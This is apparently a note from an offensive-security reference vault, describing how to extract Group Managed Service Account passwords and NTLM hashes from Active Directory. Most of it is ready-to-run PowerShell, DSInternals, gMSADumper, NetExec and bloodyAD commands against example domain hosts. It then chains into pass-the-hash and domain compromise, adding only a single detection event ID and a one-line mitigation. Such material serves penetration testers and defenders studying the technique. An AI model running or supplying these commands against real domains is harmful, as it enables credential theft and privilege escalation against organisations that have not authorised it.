---
title: "Attack #73 — gMSA Password Extraction"
description: "Group Managed Service Accounts (gMSAs) have their passwords automatically managed by AD and stored in the msDS-ManagedPassword attribute. Principals…"
category: active-directory
tags: ["active-directory", "credential-access", "ntlm", "privilege-escalation", "hashing"]
tools: ["NetExec", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Ten/🔷 Attack #73 — gMSA Password Extraction.md"
---
# 🔷 Attack #73 — gMSA Password Extraction

***

## 📖 How It Works

Group Managed Service Accounts (gMSAs) have their passwords automatically managed by AD and stored in the `msDS-ManagedPassword` attribute. Principals authorized to retrieve this password (defined in `msDS-GroupMSAMembership`) can extract the NTLM hash of the gMSA. If a gMSA has privileged access (e.g., DA-equivalent or DCSync rights), extracting its hash = domain compromise.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Authorized to retrieve gMSA password** | Listed in `msDS-GroupMSAMembership` |
| **Or compromise of an authorized server** | Servers hosting services running as gMSA |

***

## 💻 Full Commands

```powershell
# ── Find gMSAs ────────────────────────────────────────────────────────────────
Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword

# ── Check who can read gMSA password ──────────────────────────────────────────
Get-ADServiceAccount svc_gmsa -Properties PrincipalsAllowedToRetrieveManagedPassword |
  Select PrincipalsAllowedToRetrieveManagedPassword

# ── Read gMSA password (if authorized) ────────────────────────────────────────
# DSInternals:
Install-Module DSInternals -Force
$gmsa = Get-ADServiceAccount svc_gmsa -Properties msDS-ManagedPassword
(ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword').SecureCurrentPassword

# ── GMSAPasswordReader (tool) ─────────────────────────────────────────────────
.\GMSAPasswordReader.exe --AccountName svc_gmsa
```

```bash
# ── gMSADumper (Linux) ────────────────────────────────────────────────────────
python3 gMSADumper.py -u low_user -p 'Password1' -d corp.local -l DC01.corp.local

# ── NetExec ───────────────────────────────────────────────────────────────────
nxc ldap DC01.corp.local -u low_user -p 'Password1' --gmsa

# ── bloodyAD ──────────────────────────────────────────────────────────────────
bloodyAD -d corp.local -u low_user -p 'Password1' --host DC01.corp.local \
  get object 'svc_gmsa$' --attr msDS-ManagedPassword
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4662** | Security Log (DC) | Read access to `msDS-ManagedPassword` attribute |

***

## 🔗 Attack Chain Context

```
[gMSA] ──→ Extract managed password hash → impersonate service account
         │
         ├──→ 🔑 gMSA may have DA-equivalent rights or DCSync permissions
         ├──→ 🔗 PtH with gMSA hash → lateral movement / privilege escalation
         └──→ 💀 Defeated by: restrict gMSA password retrieval delegation
```

***

> ✅ **Attack #73 — gMSA Password Extraction complete.**
